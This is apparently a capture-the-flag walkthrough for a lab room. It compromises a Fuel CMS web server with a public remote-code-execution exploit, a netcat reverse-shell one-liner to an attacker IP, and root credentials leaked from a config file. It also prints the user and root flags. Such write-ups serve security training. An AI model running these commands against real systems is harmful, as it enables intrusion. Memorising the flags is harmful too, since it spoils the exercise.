---
A new start-up has a few issues with their web server.
---

![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/676cb3273c613c9ba00688162efc0979.png)


```
┌──(root㉿kali)-[/home/kali/Downloads/hacker_vs_hacker]
└─# masscan -p- --rate=10000 10.10.193.73
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-09-25 04:26:42 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]


to see open ports quickly then nmap


going to http://10.10.193.73
That's it!

To access the FUEL admin, go to:
http://10.10.193.73/fuel
User name: admin
Password: admin (you can and should change this password and admin user information after logging in)

http://10.10.193.73/fuel/dashboard

success

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ searchsploit fuel    
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
AMD Fuel Service - 'Fuel.service' Unquote Service Path                 | windows/local/49535.txt
Franklin Fueling Systems Colibri Controller Module 1.8.19.8580 - Local | linux/remote/50861.txt
Franklin Fueling TS-550 evo 2.0.0.6833 - Multiple Vulnerabilities      | hardware/webapps/31180.txt
fuel CMS 1.4.1 - Remote Code Execution (1)                             | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                             | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                             | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)            | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                   | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)       | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)                     | php/webapps/50884.txt
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                         
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ searchsploit -m php/webapps/50477.py

  Exploit: Fuel CMS 1.4.1 - Remote Code Execution (3)
      URL: https://www.exploit-db.com/exploits/50477
     Path: /usr/share/exploitdb/exploits/php/webapps/50477.py
File Type: Python script, ASCII text executable

Copied to: /home/kali/Downloads/hacker_vs_hacker/50477.py

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ python3 50477.py -u http://10.10.193.73                        
[+]Connecting...
Enter Command $id
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)


┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ python3 50477.py -u http://10.10.193.73
[+]Connecting...
Enter Command $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.1.77 1337 >/tmp/f

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.193.73.
Ncat: Connection from 10.10.193.73:41370.
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ 

www-data@ubuntu:/var/www/html$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
www-data
www-data@ubuntu:/home$ cd www-data
cd www-data
www-data@ubuntu:/home/www-data$ ls
ls
flag.txt
www-data@ubuntu:/home/www-data$ cat flag.txt
cat flag.txt
6470e394cbf6dab6a91682cc8585059b 

priv esc


www-data@ubuntu:/home/www-data$ cat /var/www/html/fuel/application/config/database.php
<ata$ cat /var/www/html/fuel/application/config/database.php                 
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|       ['dsn']      The full DSN string describe a connection to the database.
|       ['hostname'] The hostname of your database server.
|       ['username'] The username used to connect to the database
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
|       ['dbdriver'] The database driver. e.g.: mysqli.
|                       Currently supported:
|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|       ['dbprefix'] You can add an optional prefix, which will be added
|                                to the table name when using the  Query Builder class
|       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
|       ['cache_on'] TRUE/FALSE - Enables/disables query caching
|       ['cachedir'] The path to the folder where cache files should be stored
|       ['char_set'] The character set used in communicating with the database
|       ['dbcollat'] The character collation used in communicating with the database
|                                NOTE: For MySQL and MySQLi databases, this setting is only used
|                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
|                                (and in table creation queries made with DB Forge).
|                                There is an incompatibility in PHP with mysql_real_escape_string() which
|                                can make your site vulnerable to SQL injection if you are using a
|                                multi-byte character set and are running versions lower than these.
|                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|       ['swap_pre'] A default table prefix that should be swapped with the dbprefix
|       ['encrypt']  Whether or not to use an encrypted connection.
|
|                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|                               'ssl_key'    - Path to the private key file
|                               'ssl_cert'   - Path to the public key certificate file
|                               'ssl_ca'     - Path to the certificate authority file
|                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|       ['compress'] Whether or not to use client compression (MySQL only)
|       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|                                                       - good for ensuring strict SQL while developing
|       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.
|       ['failover'] array - A array with 0 or more data for connections if the main should fail.
|       ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
|                               NOTE: Disabling this will also effectively disable both
|                               $this->db->last_query() and profiling of DB queries.
|                               When you run a query, with this setting set to TRUE (default),
|                               CodeIgniter will store the SQL statement for debugging purposes.
|                               However, this may cause high memory usage, especially if you run
|                               a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}

root:mememe

www-data@ubuntu:/home/www-data$ su root
su root
Password: mememe

root@ubuntu:/home/www-data# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/home/www-data# cat /root/root.txt
cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d 

```




User.txt
*6470e394cbf6dab6a91682cc8585059b*




Root.txt
*b9bbcb33e11b80be759c4e844862482d*





[[Startup]]